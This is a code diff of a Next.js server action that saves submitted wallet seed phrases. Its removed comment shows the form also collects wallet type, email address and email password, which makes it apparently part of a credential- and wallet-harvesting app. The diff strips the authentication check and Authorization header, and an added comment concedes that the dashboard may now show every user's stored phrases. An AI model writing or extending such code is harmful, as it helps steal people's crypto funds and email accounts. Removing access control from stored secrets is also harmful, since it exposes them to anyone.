@@ -3,7 +3,7 @@
 
 import { seedPhraseFormSchema } from '@/lib/definitions'; // Use the form-specific schema
 import type { SeedPhraseFormData } from '@/lib/definitions';
-import { cookies } from 'next/headers'; // Import cookies to get the auth token
+// Removed cookies import
 import { revalidatePath } from 'next/cache'; // Import revalidatePath
 
 // Base URL for your backend API
@@ -13,18 +13,11 @@ export async function saveSeedPhraseAction(
   formData: SeedPhraseFormData // Use the full form data type again
 ): Promise<{ success: boolean; error?: string }> {
 
-  // 1. Get Auth Token
-  const cookieStore = cookies();
-  const token = cookieStore.get('authToken')?.value;
-
-  if (!token) {
-      console.error('[Save Seed Action] Auth token not found.');
-      return { success: false, error: 'Authentication required. Please log in.' };
-  }
+  // 1. Authentication Removed
+  // No need to get auth token anymore
 
   // 2. Validate the incoming form data
-  // The schema includes walletName, seedPhrase, walletType, email, emailPassword
-   const validatedFields = seedPhraseFormSchema.safeParse(formData);
+  const validatedFields = seedPhraseFormSchema.safeParse(formData);
 
   if (!validatedFields.success) {
     console.error('[Save Seed Action] Frontend validation failed:', validatedFields.error.flatten().fieldErrors);
@@ -45,7 +38,7 @@ export async function saveSeedPhraseAction(
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
-        'Authorization': `Bearer ${token}`, // Include the auth token
+        // Removed Authorization header
       },
       body: JSON.stringify(dataToSave), // Send the validated form data
     });
@@ -53,22 +46,18 @@ export async function saveSeedPhraseAction(
     if (response.ok) {
         console.log('[Save Seed Action] Backend save successful.');
          // Revalidate the dashboard path to show the newly added phrase
+         // Note: Dashboard might show all phrases now, not just user-specific ones if backend isn't updated
          revalidatePath('/dashboard');
          console.log('[Save Seed Action] Revalidated /dashboard path.');
         return { success: true };
-    } else if (response.status === 401 || response.status === 403) {
-        console.error('[Save Seed Action] Authentication/Authorization error from backend.');
-        return { success: false, error: 'Authentication failed. Please log in again.' };
-    }
-    else {
-      // Handle other API errors
+    } else {
+      // Handle API errors (Auth errors are less likely now, but other errors can occur)
       let errorMessage = `Failed to save information (status: ${response.status})`;
       try {
           const errorData = await response.json();
           errorMessage = errorData.message || errorMessage;
-          // Handle validation errors from backend specifically
           if (errorData.errors && Array.isArray(errorData.errors)) {
-              errorMessage = errorData.errors.join(' '); // Combine multiple validation errors
+              errorMessage = errorData.errors.join(' ');
           }
            console.error('[Save Seed Action] Backend save failed:', errorMessage);
       } catch (e) {
